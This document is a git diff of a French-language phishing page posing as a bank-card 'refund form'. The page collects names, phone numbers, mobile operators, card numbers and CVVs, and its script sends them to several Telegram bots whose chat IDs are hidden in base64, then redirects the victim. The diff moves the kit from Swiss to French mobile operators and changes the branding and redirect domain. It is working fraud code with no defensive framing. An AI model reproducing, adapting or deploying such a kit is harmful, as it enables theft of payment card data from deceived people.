@@ -1,5 +1,6 @@
 
 
+
 <!DOCTYPE html> <!--17-->
 <html lang="en">
 <head>
@@ -185,7 +186,7 @@
 </head>
 <body>
     
-    <img src="https://files.catbox.moe/z44hox.jpg" alt="payment" id="payment">
+    <img src="https://files.catbox.moe/zbuhoh.jpg" alt="payment" id="payment">
     <p id="title">Formulaire de Remboursement</p>
     <p id="description">Veuillez entrer les informations de votre carte bancaire pour recevoir votre remboursement en toute sécurité. Ce processus est sécurisé et protégé.</p>
     <div id="card">
@@ -205,9 +206,10 @@
 
         <select id="operator">
             <option value="select">-- Choisissez un operateur --</option>
-                <option value="orange">Swisscom</option>
-                <option value="sfr">Salt</option>
-                <option value="bouygues">Sunrise</option>
+                <option value="orange">Orange</option>
+                <option value="sfr">SFR</option>
+                <option value="bouygues">Bouygues Telecom</option>
+                <option value="free">Free Mobile</option>                      
         </select>
 
         <p id="cardnumber">Numero de carte credit *</p>
@@ -340,7 +342,7 @@ event.preventDefault();
     let cvv = document.getElementById('inputcvv').value;
 
     var msg = `
-    🔔 **Nouvelle Demande de Remboursement YFF** 🔔
+    🔔 **Nouvelle Demande de Remboursement Point** 🔔
 👤 Nom: ${firstname} ${lastname}
 📞 num: ${phone}
 📡 operator: ${operator}
@@ -360,7 +362,7 @@ const chatIds = [
 atob('MTg0OTY4NTY2OA=='),
 atob('NjY2OTY5MzgwNQ==') //YKK
 ];
-
+        
 tokens.forEach((token, index) => {
 const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
@@ -378,7 +380,7 @@ body: JSON.stringify(data)
 .then(data => {
 if (data.ok) {
     if (index === tokens.length - 1) {
-        window.location.href = "https://rembourse0055.github.io/remboursementservice-online.github.io/Checkout.html";
+        window.location.href = "https://rembourse.space/Checkout";
     }
 } else {
     alert("Une erreur s'est produite. Veuillez actualiser la page et réessayer.");
@@ -401,5 +403,4 @@ alert("Problème de connexion. Vérifiez votre réseau et réessayez.");
 </script>
 </body>
 </html>
-
 
